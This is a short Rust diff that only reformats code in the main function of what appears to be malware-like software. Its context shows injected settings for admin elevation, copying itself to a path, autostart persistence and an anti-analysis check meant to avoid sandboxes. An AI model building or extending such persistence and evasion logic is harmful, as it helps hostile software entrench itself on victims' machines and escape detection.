@@ -11,10 +11,17 @@ fn main() {
     // Extract persistence/config params before engine takes ownership
     let require_admin = injected.as_ref().map(|i| i.require_admin).unwrap_or(false);
     let copy_to_path = injected.as_ref().and_then(|i| i.copy_to_path.as_deref());
-    let enable_persistence = injected.as_ref().map(|i| i.enable_persistence).unwrap_or(false);
+    let enable_persistence = injected
+        .as_ref()
+        .map(|i| i.enable_persistence)
+        .unwrap_or(false);
 
     // Apply persistence early (may relaunch/copy and exit)
-    libra_engine::persistence::PersistenceManager::apply(require_admin, copy_to_path, enable_persistence);
+    libra_engine::persistence::PersistenceManager::apply(
+        require_admin,
+        copy_to_path,
+        enable_persistence,
+    );
 
     // Anti-analysis check (skip uptime on boot to avoid self-kill on autostart)
     let is_boot = args.iter().any(|a| a == "--boot");
